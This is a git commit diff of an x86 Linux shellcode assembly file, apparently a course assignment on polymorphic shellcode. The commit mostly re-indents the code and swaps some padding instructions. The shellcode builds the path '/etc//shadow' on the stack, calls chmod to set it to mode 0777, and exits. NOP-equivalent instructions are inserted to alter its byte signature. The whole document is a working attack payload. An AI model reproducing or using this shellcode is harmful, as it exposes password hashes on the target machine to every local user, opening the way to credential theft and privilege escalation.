840c859704dd144d8c3c6f9c65b59ead4e7a8148
Felipe Winsnes <45699918+whitecr0wz@users.noreply.github.com>
2021-01-18 17:10:54 -0300

    Update 1.asm

--- Assignment_6/2_shellcode/1.asm
+++ Assignment_6/2_shellcode/1.asm
@@ -4,28 +4,28 @@ global _start
 
 _start:
 
-std                ; NOP Equivalent.
+       dec ebp            ; NOP Equivalent.
 
-xor eax, eax       ; Zeroes out EAX.
-cdq                ; Zeroes out EDX.
-push edx           ; Pushes the dword of EDX (0x00000000).
-mov al, 0xf        ; Moves value of syscall chmod into AL.
+       xor eax, eax       ; Zeroes out EAX.
+       cdq                ; Zeroes out EDX.
+       push edx           ; Pushes the dword of EDX (0x00000000).
+       mov al, 0xf        ; Moves value of syscall chmod into AL.
 
-sahf               ; NOP Equivalent.
-push 0x776f6461    ; woda
+       sahf               ; NOP Equivalent.
+       push 0x776f6461    ; woda
 
-cld                ; NOP Equivalent.
-push 0x68732f63    ; hs/c
+       cld                ; NOP Equivalent.
+       push 0x68732f63    ; hs/c
 
-push 0x74652f2f    ; te//
-cdq                ; NOP Equivalent.
+       push 0x74652f2f    ; te//
+       cdq                ; NOP Equivalent.
 
-mov ebx, esp       ; Copies value from ESP to EBX.
-pushfd             ; NOP Equivalent.
-mov cx, 0x1ff      ; Value that means in octal "0777".
-cmc                ; NOP Equivalent.
-int  0x80          ; Call to kernel.
+       mov ebx, esp       ; Copies value from ESP to EBX.
+       pushfd             ; NOP Equivalent.
+       mov cx, 0x1ff      ; Value that means in octal "0777".
+       cmc                ; NOP Equivalent.
+       int  0x80          ; Call to kernel.
 
-inc eax            ; Increment EAX to 1, value for syscall exit().
-pushfd             ; NOP Equivalent.
-int 0x80           ; Call to kernel.
+       inc eax            ; Increment EAX to 1, value for syscall exit().
+       pushad             ; NOP Equivalent.
+       int 0x80           ; Call to kernel.
